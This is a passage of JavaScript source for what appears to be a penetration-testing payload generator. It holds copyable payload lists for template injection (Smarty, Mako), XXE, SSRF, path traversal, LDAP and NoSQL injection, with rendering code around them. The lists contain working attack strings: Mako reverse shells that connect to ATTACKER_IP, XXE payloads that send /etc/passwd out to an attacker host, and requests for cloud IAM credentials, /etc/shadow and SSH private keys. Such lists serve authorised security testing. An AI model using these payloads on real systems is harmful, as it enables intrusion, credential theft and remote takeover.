    { p: "{$smarty.server.SCRIPT_NAME}", cat: "Information disclosure" },
    { p: "{$smarty.env.PATH}", cat: "Information disclosure" },
    { p: "{if 1==1}vulnerable{/if}", cat: "Detection" },
    { p: "{math equation=\"7*7\"}", cat: "Detection" },
    { p: "{assign var='x' value=7*7}{$x}", cat: "Detection" },
    { p: "{\"id\"|system}", cat: "RCE" },
    { p: "{\"id\"|exec}", cat: "RCE" },
    { p: "{$smarty.block.child}", cat: "Information disclosure" },
    { p: "{php}passthru($_GET['cmd']);{/php}", cat: "RCE" },
    { p: "{php}echo shell_exec('whoami');{/php}", cat: "RCE" },
    { p: "{php}echo shell_exec('sleep 5');{/php}", cat: "Blind time-based" },
    { p: "{php}exec('ping -c 5 127.0.0.1');{/php}", cat: "Blind time-based" },
    { p: "{literal}{7*7}{/literal}", cat: "Filter bypass" },
    { p: "{ldelim}7*7{rdelim}", cat: "Filter bypass" },
    { p: "{'sy'|cat:'stem'}('id')", cat: "Filter bypass" },
    { p: "{registerFilter}", cat: "Information disclosure" },
    { p: "{$smarty.now}", cat: "Detection" },
    { p: "{counter}", cat: "Detection" },
  ],
  mako: [
    { p: "${7*7}", cat: "Detection" },
    { p: "${7*'7'}", cat: "Detection" },
    { p: "<%\nimport os\nx=os.popen('id').read()\n%>${x}", cat: "RCE" },
    { p: "${self.module.cache.util.os.popen('id').read()}", cat: "RCE" },
    { p: "${{}.__class__.__base__.__subclasses__()}", cat: "Information disclosure" },
    { p: "<% import subprocess %>${subprocess.check_output('id',shell=True)}", cat: "RCE" },
    { p: "${__import__('os').popen('id').read()}", cat: "RCE" },
    { p: "<%! import os %>${os.popen('whoami').read()}", cat: "RCE" },
    { p: "${self}", cat: "Information disclosure" },
    { p: "${context}", cat: "Information disclosure" },
    { p: "${context.keys()}", cat: "Information disclosure" },
    { p: "<%\nimport os\nresult = os.popen('cat /etc/passwd').read()\n%>${result}", cat: "File read" },
    { p: "${x if x else ''}", cat: "Detection" },
    { p: "% if 1==1:\nvulnerable\n% endif", cat: "Detection" },
    { p: "${1+1}", cat: "Detection" },
    { p: "<%\nimport time\ntime.sleep(5)\n%>", cat: "Blind time-based" },
    { p: "<% import os %>${os.popen('sleep 5').read()}", cat: "Blind time-based" },
    { p: "<% import os %>${os.popen('ping -c 5 127.0.0.1').read()}", cat: "Blind time-based" },
    { p: "${self.module.cache.util.os.popen('whoami').read()}", cat: "RCE" },
    { p: "<%page args=\"x\"/>${x}", cat: "Detection" },
    { p: "<%def name=\"evil()\">${__import__('os').popen('id').read()}</%def>${evil()}", cat: "RCE" },
    { p: "${next.body()}", cat: "Information disclosure" },
    { p: "${UNDEFINED}", cat: "Detection" },
    { p: "<% raise Exception('test') %>", cat: "Detection" },
    { p: "${h}", cat: "Detection" },
    { p: "<%\nimport subprocess\nsubprocess.call(['nc','ATTACKER_IP','4444','-e','/bin/sh'])\n%>", cat: "RCE" },
    { p: "${__import__('subprocess').check_output(['whoami'])}", cat: "RCE" },
    { p: "<%\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('ATTACKER_IP',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n%>", cat: "RCE" },
    { p: "${filters.html_escape}", cat: "Filter bypass" },
    { p: "<%doc>${7*7}</%doc>", cat: "Filter bypass" },
  ],
};

const SSTI_ENGINE_LABELS = { jinja2: "Jinja2 (Python)", twig: "Twig (PHP)", freemarker: "FreeMarker (Java)", velocity: "Velocity (Java)", pebble: "Pebble (Java)", smarty: "Smarty (PHP)", mako: "Mako (Python)" };
const SSTI_CATS = ["Detection", "Information disclosure", "File read", "Blind time-based", "Filter bypass", "RCE"];

function renderSSTIPanel(container) {
  let engine = "jinja2";
  let catFilter = "all";
  let search = "";
  let encMode = "none";

  function baseFiltered() {
    const q = search.trim().toLowerCase();
    return SSTI_PAYLOADS[engine].filter((it) => {
      if (catFilter !== "all" && it.cat !== catFilter) return false;
      if (q && !it.p.toLowerCase().includes(q)) return false;
      return true;
    });
  }

  function paint() {
    const items = baseFiltered();
    const total = Object.values(SSTI_PAYLOADS).reduce((a, arr) => a + arr.length, 0);
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">SSTI Payload Generator <span class="pg-count-badge">${SSTI_PAYLOADS[engine].length} payloads for ${esc(SSTI_ENGINE_LABELS[engine])}</span></h2>
        <p class="muted">Server-side template injection payloads across seven template engines, from detection polyglots through remote code execution gadget chains.</p>
        <div class="pg-sub-tabs" id="ssti-etabs">
          ${Object.keys(SSTI_ENGINE_LABELS).map((e) => `<button data-e="${e}" class="${e === engine ? "active" : ""}">${esc(SSTI_ENGINE_LABELS[e])}</button>`).join("")}
        </div>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="ssti-search" placeholder="search payloads..." value="${esc(search)}" style="flex:2;min-width:180px">
          <select class="tk-f" id="ssti-cat" style="min-width:190px">
            <option value="all"${catFilter === "all" ? " selected" : ""}>All categories</option>
            ${SSTI_CATS.map((c) => `<option value="${esc(c)}"${catFilter === c ? " selected" : ""}>${esc(c)}</option>`).join("")}
          </select>
          ${encSelectHtml("ssti-enc", ["none", "url", "doubleUrl", "base64", "unicodeEscape"], encMode)}
        </div>
        <div class="tk-btns">
          <button class="btn sm" id="ssti-copyall">Copy all shown (${items.length})</button>
          <button class="btn sm ghost" id="ssti-download">Download .txt</button>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${items.length}</div><div class="stat-l">shown</div></div>
          <div class="stat"><div class="stat-n">${total}</div><div class="stat-l">total across all engines</div></div>
          <div class="stat"><div class="stat-n">${Object.keys(SSTI_ENGINE_LABELS).length}</div><div class="stat-l">engines covered</div></div>
        </div>
        <div class="pg-list" id="ssti-list">${items.map((it, i) => `
          <div class="pg-item">
            <div class="pg-item-top"><span class="pg-item-group">${esc(it.cat)}</span><button class="btn sm ghost pg-copy" data-i="${i}">copy</button></div>
            <code class="dl-cmd cmd-block pg-code">${esc(applyEnc(encMode, it.p))}</code>
          </div>`).join("") || `<div class="pg-empty">No payloads match the current filters.</div>`}
        </div>
      </div>`;

    container.querySelectorAll("#ssti-etabs button").forEach((b) => { b.onclick = () => { engine = b.dataset.e; paint(); }; });
    container.querySelector("#ssti-search").oninput = (e) => { search = e.target.value; paint(); };
    container.querySelector("#ssti-cat").onchange = (e) => { catFilter = e.target.value; paint(); };
    container.querySelector("#ssti-enc").onchange = (e) => { encMode = e.target.value; paint(); };
    container.querySelector("#ssti-copyall").onclick = (e) => { copyText(items.map((it) => applyEnc(encMode, it.p)).join("\n")); flashBtn(e.target, "copied!"); };
    container.querySelector("#ssti-download").onclick = () => downloadText("ssti-" + engine + "-payloads.txt", items.map((it) => applyEnc(encMode, it.p)).join("\n"));
    container.querySelectorAll(".pg-copy").forEach((b) => {
      b.onclick = () => { copyText(applyEnc(encMode, items[+b.dataset.i].p)); flashBtn(b, "copied"); };
    });
  }

  paint();
}

/* ============================================================================================
 * XXE — XML External Entity injection
 * ========================================================================================== */

const XXE_GROUPS = [
  { label: "Classic file read", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", note: "Basic external entity file read" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>", note: "" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>", note: "Windows target" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>", note: "" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>", note: "Linux env vars" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><root>&xxe;</root>", note: "" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>", note: "" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>", note: "PHP wrapper base64 encode" },
  ] },
  { label: "Parameter entities / blind OOB", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://ATTACKER_IP/evil.dtd\">%xxe;]><root>&exfil;</root>", note: "Loads external DTD" },
    { p: "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://ATTACKER_IP/evil.dtd\"> %ext;]>", note: "" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://ATTACKER_IP/evil.dtd\">%dtd;]><root>&send;</root>", note: "Chained param entities for OOB exfil" },
    { p: "evil.dtd: <!ENTITY % all \"<!ENTITY send SYSTEM 'http://ATTACKER_IP/?x=%file;'>\">%all;", note: "Hosted DTD content" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p1 SYSTEM \"file:///etc/hostname\"><!ENTITY % p2 \"<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?d=%p1;'>\">%p2;]><r>&exfil;</r>", note: "" },
    { p: "<!DOCTYPE r [<!ENTITY % remote SYSTEM \"http://ATTACKER_IP/param.dtd\">%remote;%init;%trick;]>", note: "Multi-stage blind exfil" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://ATTACKER_IP:8080/x.dtd\"> %dtd;]><root></root>", note: "" },
  ] },
  { label: "SSRF via XXE", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", note: "AWS metadata SSRF" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root>&xxe;</root>", note: "AWS IAM creds" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><root>&xxe;</root>", note: "GCP metadata SSRF" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://internal-service.local:8080/admin\">]><root>&xxe;</root>", note: "Internal service reach" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:6379/\">]><root>&xxe;</root>", note: "Local Redis probe" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_FLUSHALL\">]><root>&xxe;</root>", note: "Gopher protocol Redis command" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:9200/_cluster/health\">]><root>&xxe;</root>", note: "Internal Elasticsearch probe" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/actuator/env\">]><root>&xxe;</root>", note: "Spring Boot actuator probe" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\">]><root>&xxe;</root>", note: "Azure IMDS via XXE" },
  ] },
  { label: "Error-based / out-of-band data exfil", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY %25 error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>", note: "Forces parser error containing file content" },
    { p: "<!DOCTYPE r [<!ENTITY % file SYSTEM \"file:///c:/windows/win.ini\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>\">%eval;%error;]>", note: "Windows variant" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY %25 error SYSTEM 'file:///%file;'>\">%eval;%error;]>", note: "PHP wrapper + error trick" },
  ] },
  { label: "Billion laughs / DoS", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">]><lolz>&lol4;</lolz>", note: "Exponential entity expansion" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"1234567890\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">]><bomb>&c;</bomb>", note: "" },
  ] },
  { label: "Alternative entry points", payloads: [
    { p: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"200\"><text>&xxe;</text></svg>", note: "SVG upload XXE" },
    { p: "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><office:document-content xmlns:office=\"urn:oasis\"><office:body>&xxe;</office:body></office:document-content>", note: "DOCX/ODT content.xml XXE" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>", note: "SOAP request XXE" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss><channel><title>&xxe;</title></channel></rss>", note: "RSS feed parser XXE" },
    { p: "<!DOCTYPE html [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><html>&xxe;</html>", note: "XHTML parser XXE" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><![CDATA[&xxe;]]></data>", note: "CDATA wrapper" },
  ] },
  { label: "Filter bypass / encoding", payloads: [
    { p: "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", note: "UTF-16 encoding to slip past regex filters" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % sp SYSTEM \"file:///dev/random\">]>", note: "Trigger resource exhaustion instead of read" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"jar:http://ATTACKER_IP/evil.jar!/x.txt\">]><r>&xxe;</r>", note: "Java jar: protocol handler" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><r>&xxe;</r>", note: "netdoc:// Java-specific protocol" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"expect://id\">]><r>&xxe;</r>", note: "expect wrapper (with expect module loaded) for RCE" },
    { p: "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://ATTACKER_IP/evil.dtd\"><r>&exfil;</r>", note: "External DOCTYPE reference (no internal subset)" },
  ] },
];

function renderXXEPanel(container) {
  genericPanel(container, {
    key: "xxe",
    title: "XXE Payload Generator",
    desc: "XML External Entity payloads for file disclosure, SSRF pivoting, blind out-of-band exfiltration via parameter entities, denial of service, and alternate upload-format entry points (SVG, DOCX, SOAP, RSS). Replace ATTACKER_IP with your listener.",
    encModes: ["none", "url", "doubleUrl", "base64", "htmlDec", "htmlHex"],
    groups: XXE_GROUPS,
  });
}

/* ============================================================================================
 * SSRF — Server-Side Request Forgery
 * ========================================================================================== */

const SSRF_GROUPS = [
  { label: "Cloud metadata endpoints", payloads: [
    { p: "http://169.254.169.254/latest/meta-data/", note: "AWS EC2 IMDSv1" },
    { p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", note: "AWS IAM role credentials" },
    { p: "http://169.254.169.254/latest/user-data/", note: "AWS user-data script (often has secrets)" },
    { p: "http://169.254.169.254/latest/api/token", note: "AWS IMDSv2 token endpoint (needs PUT)" },
    { p: "http://metadata.google.internal/computeMetadata/v1/", note: "GCP metadata (needs Metadata-Flavor: Google header)" },
    { p: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", note: "GCP service account token" },
    { p: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", note: "Azure IMDS (needs Metadata: true header)" },
    { p: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", note: "Azure managed identity token" },
    { p: "http://100.100.100.200/latest/meta-data/", note: "Alibaba Cloud metadata" },
    { p: "http://169.254.169.254/openstack/latest/meta_data.json", note: "OpenStack metadata" },
  ] },
  { label: "IP format / obfuscation bypass", payloads: [
    { p: "http://0177.0.0.1/", note: "Octal IP for 127.0.0.1" },
    { p: "http://2130706433/", note: "Decimal IP for 127.0.0.1" },
    { p: "http://0x7f000001/", note: "Hex IP for 127.0.0.1" },
    { p: "http://0x7f.0x0.0x0.0x1/", note: "Mixed hex octets" },
    { p: "http://127.1/", note: "Short-form loopback" },
    { p: "http://0/", note: "Bare zero resolves to 0.0.0.0 on many systems" },
    { p: "http://[::1]/", note: "IPv6 loopback" },
    { p: "http://[0:0:0:0:0:ffff:127.0.0.1]/", note: "IPv6-mapped IPv4" },
    { p: "http://127.000.000.001/", note: "Zero-padded octets" },
    { p: "http://localhost.localdomain/", note: "Alternate loopback hostname" },
    { p: "http://[::ffff:127.0.0.1]/", note: "IPv4-mapped IPv6" },
    { p: "http://127.0.0.1.nip.io/", note: "Wildcard DNS service resolving to given IP" },
    { p: "http://spoofed.burpcollaborator.net/", note: "Interaction/OOB detection service" },
  ] },
  { label: "DNS rebinding / redirect chains", payloads: [
    { p: "http://attacker-controlled-rebind.example/", note: "Domain that resolves to public IP then 127.0.0.1 on second lookup" },
    { p: "http://short-ttl-dns.example/", note: "Very low TTL DNS record for rebinding attacks" },
    { p: "http://redirect.example/?to=http://169.254.169.254/latest/meta-data/", note: "Open redirect chained into SSRF" },
    { p: "http://bit.ly/malicious-redirect", note: "URL shortener redirect to internal target" },
    { p: "http://example.com@169.254.169.254/", note: "Userinfo confusion — parsed host may be 169.254.169.254" },
    { p: "http://169.254.169.254#@example.com/", note: "Fragment confusion for naive host validators" },
    { p: "http://example.com/redirect?url=http://127.0.0.1:6379/", note: "App-level redirect param abuse" },
    { p: "https://attacker.com/302-to-internal", note: "302 response pointing at internal resource" },
  ] },
  { label: "Alternate protocols / port scanning", payloads: [
    { p: "gopher://127.0.0.1:6379/_FLUSHALL", note: "Gopher protocol raw Redis command" },
    { p: "gopher://127.0.0.1:11211/_stats", note: "Memcached stats via gopher" },
    { p: "dict://127.0.0.1:11211/stat", note: "dict:// protocol for internal service probing" },
    { p: "file:///etc/passwd", note: "file:// scheme local file read via SSRF sink" },
    { p: "ftp://127.0.0.1:21/", note: "Probe internal FTP" },
    { p: "http://127.0.0.1:22/", note: "Probe internal SSH banner via HTTP client error" },
    { p: "http://127.0.0.1:3306/", note: "Probe internal MySQL" },
    { p: "http://127.0.0.1:5432/", note: "Probe internal PostgreSQL" },
    { p: "http://127.0.0.1:9200/_cluster/health", note: "Probe internal Elasticsearch" },
    { p: "http://127.0.0.1:8080/actuator/env", note: "Probe Spring Boot actuator" },
    { p: "http://127.0.0.1:2375/containers/json", note: "Probe unauthenticated Docker API" },
    { p: "http://127.0.0.1:10250/pods", note: "Probe Kubernetes kubelet API" },
  ] },
  { label: "URL parser confusion", payloads: [
    { p: "http://169.254.169.254%2F%2F@example.com/", note: "Encoded slash before at-sign" },
    { p: "http:169.254.169.254", note: "Missing slashes, some parsers still resolve host" },
    { p: "http:/169.254.169.254", note: "Single slash form" },
    { p: "http://169.254.169.254\\@example.com/", note: "Backslash confusion in some HTTP clients" },
    { p: "https://169.254.169.254:443\\.example.com/", note: "Port + backslash confusion" },
    { p: "http://example.com%00.169.254.169.254/", note: "Null byte host termination" },
    { p: "http://169.254.169.254%09/", note: "Tab character injection in host" },
    { p: "http://[::ffff:169.254.169.254]/", note: "IPv6-mapped metadata IP" },
  ] },
];

function renderSSRFPanel(container) {
  genericPanel(container, {
    key: "ssrf",
    title: "SSRF Payload Generator",
    desc: "Server-side request forgery targets and bypass techniques: cloud metadata endpoints, IP-format obfuscation, DNS rebinding/redirect chains, alternate protocol handlers for internal port scanning, and URL-parser confusion tricks.",
    encModes: ["none", "url", "doubleUrl", "base64", "hexEscape"],
    groups: SSRF_GROUPS,
  });
}

/* ============================================================================================
 * Path Traversal
 * ========================================================================================== */

function ptDepthVariants(sep, targets, maxDepth) {
  const out = [];
  for (const t of targets) {
    out.push(sep.repeat(maxDepth) + t);
  }
  return out;
}

const PT_LINUX_TARGETS = ["etc/passwd", "etc/shadow", "etc/hosts", "etc/hostname", "proc/self/environ", "var/log/auth.log", "root/.ssh/id_rsa", "var/www/html/config.php"];
const PT_WIN_TARGETS = ["windows/win.ini", "windows/system32/drivers/etc/hosts", "boot.ini", "windows/system32/config/sam", "inetpub/wwwroot/web.config"];

const PATH_GROUPS = [
  { label: "Basic relative traversal (Linux)", payloads: ptDepthVariants("../", PT_LINUX_TARGETS, 6).map((p) => ({ p, note: "" })) },
  { label: "Basic relative traversal (Windows)", payloads: ptDepthVariants("..\\", PT_WIN_TARGETS, 6).map((p) => ({ p, note: "" })) },
  { label: "URL-encoded traversal", payloads: [
    { p: "..%2f..%2f..%2f..%2fetc%2fpasswd", note: "%2f = /" },
    { p: "..%2F..%2F..%2F..%2Fetc%2Fpasswd", note: "uppercase hex" },
    { p: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", note: "%2e = ." },
    { p: "%2e%2e/%2e%2e/%2e%2e/etc/passwd", note: "mixed encoding" },
    { p: "..%5c..%5c..%5cwindows%5cwin.ini", note: "%5c = backslash" },
    { p: "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", note: "" },
    { p: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", note: "overlong UTF-8 slash" },
    { p: "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini", note: "overlong UTF-8 backslash" },
    { p: "....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd", note: "" },
  ] },
  { label: "Double URL-encoded traversal", payloads: [
    { p: "..%252f..%252f..%252f..%252fetc%252fpasswd", note: "%252f decodes to %2f then /" },
    { p: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", note: "" },
    { p: "..%255c..%255c..%255cwindows%255cwin.ini", note: "" },
    { p: "..%25c0%25afetc%25c0%25afpasswd", note: "double-encoded overlong slash" },
  ] },
  { label: "Null byte / truncation bypass", payloads: [
    { p: "../../../../etc/passwd%00", note: "classic legacy PHP null byte truncation" },
    { p: "../../../../etc/passwd%00.jpg", note: "bypass extension whitelist" },
    { p: "../../../../etc/passwd%00.png", note: "" },
    { p: "..\\..\\..\\..\\windows\\win.ini%00", note: "" },
    { p: "../../../../etc/passwd\\0", note: "raw null byte representation" },
    { p: "../../../../etc/passwd#", note: "hash truncation for some parsers" },
    { p: "../../../../etc/passwd?", note: "query truncation for some parsers" },
  ] },
  { label: "Filter-bypass tricks (dot/slash substitution)", payloads: [
    { p: "....//....//....//etc/passwd", note: "doubled dots defeat naive ../ stripping" },
    { p: "....\\\\....\\\\....\\\\windows\\win.ini", note: "" },
    { p: "..././..././..././etc/passwd", note: "interleaved self-reference" },
    { p: "..;/..;/..;/etc/passwd", note: "path-parameter (matrix) bypass for some Java servers" },
    { p: "..//..//..//etc/passwd", note: "doubled slash" },
    { p: ".././.././.././etc/passwd", note: "" },
    { p: "..\\/..\\/..\\/etc/passwd", note: "mixed separators" },
    { p: "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", note: "leading slash + encoded dots" },
    { p: "..\\..\\..\\..\\..\\..\\etc\\passwd", note: "backslashes against Linux target (works on some frameworks)" },
  ] },
  { label: "Absolute path / wrapper bypass", payloads: [
    { p: "/etc/passwd", note: "direct absolute path, no traversal needed" },
    { p: "file:///etc/passwd", note: "file:// scheme" },
    { p: "\\\\?\\C:\\Windows\\win.ini", note: "Windows extended-length path prefix" },
    { p: "\\\\localhost\\c$\\windows\\win.ini", note: "UNC path" },
    { p: "C:\\inetpub\\wwwroot\\..\\..\\windows\\win.ini", note: "absolute base + traversal" },
    { p: "php://filter/convert.base64-encode/resource=../../../../etc/passwd", note: "PHP filter wrapper" },
    { p: "php://filter/read=convert.base64-encode/resource=index.php", note: "read source without execution" },
    { p: "zip://shell.jpg%23payload.php", note: "PHP zip wrapper for archive traversal" },
    { p: "phar://shell.phar/payload.php", note: "PHP phar wrapper" },
  ] },
  { label: "Deep nesting / brute-depth variants", payloads: [
    { p: "../etc/passwd", note: "depth 1" },
    { p: "../../etc/passwd", note: "depth 2" },
    { p: "../../../etc/passwd", note: "depth 3" },
    { p: "../../../../etc/passwd", note: "depth 4" },
    { p: "../../../../../etc/passwd", note: "depth 5" },
    { p: "../../../../../../etc/passwd", note: "depth 6" },
    { p: "../../../../../../../etc/passwd", note: "depth 7" },
    { p: "../../../../../../../../etc/passwd", note: "depth 8" },
    { p: "../../../../../../../../../etc/passwd", note: "depth 9" },
    { p: "../../../../../../../../../../etc/passwd", note: "depth 10" },
    { p: "../../../../../../../../../../../../etc/passwd", note: "depth 12, for deeply nested webroots" },
  ] },
];

function renderPathPanel(container) {
  genericPanel(container, {
    key: "path-traversal",
    title: "Path Traversal Payload Generator",
    desc: "Directory traversal and local file inclusion payloads: raw relative traversal at multiple depths, single/double URL-encoded variants, overlong-UTF8 encoding, null-byte truncation, dot/slash substitution filter bypasses, and wrapper-scheme tricks (PHP filter/zip/phar, UNC paths).",
    encModes: ["none", "url", "doubleUrl", "base64", "overlongUtf8", "hexEscape"],
    groups: PATH_GROUPS,
  });
}

/* ============================================================================================
 * LDAP Injection
 * ========================================================================================== */

const LDAP_GROUPS = [
  { label: "Authentication bypass", payloads: [
    { p: "*", note: "Matches any value in a filter" },
    { p: "*)(&", note: "Injects an always-true clause" },
    { p: "*)(uid=*))(|(uid=*", note: "Classic auth bypass in uid filter" },
    { p: "admin)(&)", note: "" },
    { p: "admin)(!(&(1=0", note: "" },
    { p: "*)(objectClass=*", note: "Matches any object class" },
    { p: "*))%00", note: "Null byte truncation of remaining filter" },
    { p: "admin*", note: "Wildcard username match" },
    { p: "*)(userPassword=*", note: "" },
    { p: "*)(mail=*", note: "" },
  ] },
  { label: "Boolean / blind extraction", payloads: [
    { p: "*)(cn=a*", note: "Enumerate cn starting with a" },
    { p: "*)(cn=b*", note: "" },
    { p: "*)(uid=admin)(|(uid=*", note: "" },
    { p: "*)(&(objectClass=user)(cn=admin*", note: "" },
    { p: "test*)(uid=*))(|(uid=*", note: "" },
    { p: "*)(description=*admin*", note: "Search description attribute" },
    { p: "*)(memberOf=cn=Admins,ou=Groups,dc=example,dc=com", note: "Group membership probe" },
    { p: "*)(|(cn=*)(sn=*", note: "" },
    { p: "a*)(|(uid=*", note: "Character-by-character enumeration start" },
    { p: "ad*)(|(uid=*", note: "" },
    { p: "adm*)(|(uid=*", note: "" },
    { p: "admi*)(|(uid=*", note: "" },
  ] },
  { label: "Blind boolean true/false probes", payloads: [
    { p: "*)(objectClass=*))(&(objectClass=void", note: "Forces false result" },
    { p: "*)(objectClass=*))(&(objectClass=*", note: "Forces true result" },
    { p: "*))(|(cn=*)(objectClass=void", note: "" },
    { p: "*))(&(objectClass=*)(objectClass=*", note: "" },
    { p: "*)(uid=*)(userPassword={x}", note: "Password prefix probe" },
  ] },
  { label: "Special-character / filter-syntax abuse", payloads: [
    { p: "(", note: "Unbalanced parenthesis to trigger filter parse error" },
    { p: "*()|%26'", note: "" },
    { p: "*()|(&", note: "" },
    { p: "|", note: "" },
    { p: "&", note: "" },
    { p: "\\29\\28", note: "Escaped closing/opening parens" },
    { p: "\\2a", note: "Escaped wildcard (*)" },
    { p: "\\00", note: "Escaped null" },
    { p: "cn=*)(|(cn=*", note: "" },
    { p: "*/*", note: "" },
  ] },
];

function renderLdapPanel(container) {
  genericPanel(container, {
    key: "ldap",
    title: "LDAP Injection Payload Generator",
    desc: "LDAP filter injection payloads for authentication bypass, blind boolean data extraction, and filter-syntax abuse against Active Directory / OpenLDAP-backed login and search forms.",
    encModes: ["none", "url", "doubleUrl", "hexEscape", "unicodeEscape"],
    groups: LDAP_GROUPS,
  });
}

/* ============================================================================================
 * NoSQL Injection
 * ========================================================================================== */

const NOSQL_GROUPS = [
  { label: "MongoDB — authentication bypass", payloads: [
    { p: '{"username": {"$ne": null}, "password": {"$ne": null}}', note: "JSON body auth bypass" },
    { p: '{"username": "admin", "password": {"$ne": ""}}', note: "" },
    { p: "username[$ne]=toString&password[$ne]=toString", note: "Form-encoded operator injection" },
